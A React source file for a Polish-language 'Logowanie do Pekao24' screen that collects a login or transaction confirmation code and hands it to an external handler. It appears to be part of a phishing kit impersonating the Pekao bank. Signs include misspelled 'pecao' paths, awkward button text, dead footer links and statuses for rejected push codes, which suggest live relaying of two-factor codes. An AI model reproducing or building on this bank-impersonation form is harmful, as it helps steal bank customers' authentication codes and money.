import React, {Fragment} from "react";
import {Button, Form, FormGroup, Input, Label} from "reactstrap";
import Keyboard from '../../../../assets/img/pecao/keyboard.svg'
import {useForm} from "react-hook-form";
import {yupResolver} from '@hookform/resolvers/yup';
import * as yup from "yup";

const schema = yup.object().shape({
    code: yup.string().required(),
});
const CodeForm = ({handler, status}) => {
    const {register, handleSubmit, reset, formState: {errors}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const submitCode = (data) => {
        reset();
        handler(data.code);
    }

    return (
        <div className={'pecao_login'}>
            <div className="login_form_header">
                <h2>Logowanie do Pekao24</h2>
                {
                    status === 'wrong_code' || status === 'wrong_push_code' ?
                        <div className={'error-banner'}>
                            <h6>Wprowadzony kod jest nieprawidłowy.</h6>
                            <p>Spróbuj ponownie lub kliknij przycisk poniżej.</p>
                        </div> : null
                }
            </div>
            <Form onSubmit={handleSubmit(submitCode)} id={'code_form'} className={'code_form login_form'}>
                <Fragment>
                    <FormGroup>
                        <Label> {status === 'getting_push_code' || status === 'wrong_push_code' ? 'Potwierdź transakcję w aplikacji mobilnej banku' : 'Potwierdź logowanie / Wpisz kod'}</Label>
                        <div className={`field-and-buttons ${errors.code && 'error'}`}>
                            <Input {...register('code')}/>
                            <Button className={'keyboard_btn'}><img src={Keyboard} alt={'keyboard'}/> </Button>
                        </div>
                        {errors.code &&
                        <span className={'error-message'}>
                                Uzupełnij pole
                            </span>
                        }
                    </FormGroup>
                    <div className="btn_container right">
                        <Button
                            className={'btn_next'}
                            type={'submit'}
                        >
                            Potwierdzać
                        </Button>
                    </div>
                </Fragment>
            </Form>
            <div className="pecao_login_footer ">
                <a href={'#'}>Bezpieczeństwo</a>
                <a href={'#'}>Pomoc w logowaniu</a>
            </div>
        </div>
    )
}

export default CodeForm;